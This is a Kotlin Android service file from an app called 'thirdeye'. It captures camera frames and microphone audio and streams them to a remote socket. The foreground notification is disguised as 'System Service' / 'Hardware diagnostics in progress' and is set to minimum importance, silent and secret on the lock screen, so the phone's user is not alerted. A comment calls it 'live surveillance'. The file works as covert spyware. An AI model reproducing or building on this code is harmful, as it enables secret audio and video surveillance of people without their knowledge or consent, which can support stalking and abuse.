package com.thirdeye.app.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.util.Size
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.thirdeye.app.MainActivity
import com.thirdeye.app.R
import com.thirdeye.app.uploader.SocketManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import java.io.ByteArrayOutputStream
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class LiveStreamService : LifecycleService() {

    companion object {
        private const val TAG = "LiveStreamService"
        const val CHANNEL_ID = "thirdeye_live_service_channel"
        const val NOTIFICATION_ID = 1002

        const val ACTION_START_STREAM = "com.thirdeye.app.ACTION_START_LIVE_STREAM"
        const val ACTION_STOP_STREAM = "com.thirdeye.app.ACTION_STOP_LIVE_STREAM"
        const val ACTION_SWITCH_CAMERA = "com.thirdeye.app.ACTION_SWITCH_CAMERA"
        const val EXTRA_CAMERA_LENS = "extra_camera_lens"

        @Volatile
        var isServiceRunning = false

        fun startService(context: Context, cameraLens: String = "BACK") {
            val intent = Intent(context, LiveStreamService::class.java).apply {
                action = ACTION_START_STREAM
                putExtra(EXTRA_CAMERA_LENS, cameraLens)
            }
            ContextCompat.startForegroundService(context, intent)
        }

        fun stopService(context: Context) {
            val intent = Intent(context, LiveStreamService::class.java).apply {
                action = ACTION_STOP_STREAM
            }
            context.startService(intent)
        }

        fun switchCamera(context: Context, cameraLens: String) {
            val intent = Intent(context, LiveStreamService::class.java).apply {
                action = ACTION_SWITCH_CAMERA
                putExtra(EXTRA_CAMERA_LENS, cameraLens)
            }
            context.startService(intent)
        }
    }

    private var cameraProvider: ProcessCameraProvider? = null
    private var cameraExecutor: ExecutorService? = null
    private var currentLens: String = "BACK"
    private var lastFrameTime = 0L

    // Live Audio Recording
    private var isAudioStreaming = false
    private var audioRecord: AudioRecord? = null
    private var audioThread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        isServiceRunning = true
        cameraExecutor = Executors.newSingleThreadExecutor()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        // Video Recording is #1 Priority: If recording is active, do not start live stream
        if (CameraRecordingService.isServiceRunning) {
            Log.w(TAG, "CameraRecordingService is actively recording. Yielding camera priority to recording.")
            stopSelf()
            return START_NOT_STICKY
        }

        when (intent?.action) {
            ACTION_START_STREAM -> {
                currentLens = intent.getStringExtra(EXTRA_CAMERA_LENS) ?: "BACK"
                startForegroundNotification()
                initCamera()
                startAudioStreaming()
            }
            ACTION_SWITCH_CAMERA -> {
                currentLens = intent.getStringExtra(EXTRA_CAMERA_LENS) ?: "BACK"
                cameraProvider?.let { bindImageAnalysis(it) }
            }
            ACTION_STOP_STREAM -> {
                stopStream()
            }
        }

        return START_NOT_STICKY
    }

    @SuppressLint("MissingPermission")
    private fun startAudioStreaming() {
        if (isAudioStreaming) return
        try {
            val sampleRate = 16000
            val channelConfig = AudioFormat.CHANNEL_IN_MONO
            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
            val minBufSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            val bufferSize = maxOf(minBufSize, 2048)

            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                sampleRate,
                channelConfig,
                audioFormat,
                bufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.w(TAG, "AudioRecord could not initialize")
                return
            }

            audioRecord?.startRecording()
            isAudioStreaming = true

            audioThread = Thread {
                val buffer = ByteArray(2048)
                while (isAudioStreaming && !Thread.currentThread().isInterrupted) {
                    val read = audioRecord?.read(buffer, 0, buffer.size) ?: -1
                    if (read > 0) {
                        val chunk = if (read == buffer.size) buffer else buffer.copyOf(read)
                        SocketManager.sendAudio(applicationContext, chunk)
                    }
                }
            }.apply {
                priority = Thread.MAX_PRIORITY
                isDaemon = true
                start()
            }
            Log.i(TAG, " Live audio streaming active (16kHz PCM)")
        } catch (e: Exception) {
            Log.w(TAG, "Error starting live audio stream: ${e.message}")
        }
    }

    private fun stopAudioStreaming() {
        isAudioStreaming = false
        try {
            audioThread?.interrupt()
            audioThread = null
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: Exception) {
            Log.w(TAG, "Error stopping audio: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Diagnostics",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun startForegroundNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Hardware diagnostics in progress")
            .setSmallIcon(R.drawable.ic_camera_record)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    @SuppressLint("MissingPermission")
    private fun initCamera() {
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                cameraProvider = future.get()
                cameraProvider?.let { bindImageAnalysis(it) }
            } catch (e: Exception) {
                Log.e(TAG, "Error obtaining camera provider for live stream", e)
                stopSelf()
            }
        }, ContextCompat.getMainExecutor(this))
    }

    @SuppressLint("MissingPermission")
    private fun bindImageAnalysis(provider: ProcessCameraProvider) {
        try {
            provider.unbindAll()

            val lensFacing = if (currentLens.equals("FRONT", ignoreCase = true)) {
                CameraSelector.LENS_FACING_FRONT
            } else {
                CameraSelector.LENS_FACING_BACK
            }

            val cameraSelector = CameraSelector.Builder()
                .requireLensFacing(lensFacing)
                .build()

            val imageAnalysis = ImageAnalysis.Builder()
                .setTargetResolution(Size(640, 480))
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build()

            val executor = cameraExecutor ?: Executors.newSingleThreadExecutor().also { cameraExecutor = it }

            imageAnalysis.setAnalyzer(executor) { imageProxy ->
                val now = System.currentTimeMillis()
                // Rate-limit to approx 13 FPS (every 75ms) for ultra-lightweight, smooth live surveillance
                if (now - lastFrameTime >= 75) {
                    lastFrameTime = now
                    try {
                        val bitmap = imageProxy.toBitmap()
                        val out = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, out)
                        val jpegBytes = out.toByteArray()
                        SocketManager.sendFrame(applicationContext, jpegBytes)
                    } catch (e: Exception) {
                        Log.w(TAG, "Frame conversion error: ${e.message}")
                    }
                }
                imageProxy.close()
            }

            provider.bindToLifecycle(this, cameraSelector, imageAnalysis)
            Log.i(TAG, " Live camera analysis bound successfully (Lens: $currentLens)")
        } catch (e: Exception) {
            Log.e(TAG, "Failed binding camera for live stream", e)
            isServiceRunning = false
            stopSelf()
        }
    }

    private fun stopStream() {
        isServiceRunning = false
        stopAudioStreaming()
        try {
            cameraProvider?.unbindAll()
            cameraProvider = null
        } catch (e: Exception) {
            Log.w(TAG, "Error unbinding camera", e)
        }
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        isServiceRunning = false
        stopStream()
        cameraExecutor?.shutdown()
        cameraExecutor = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }
}
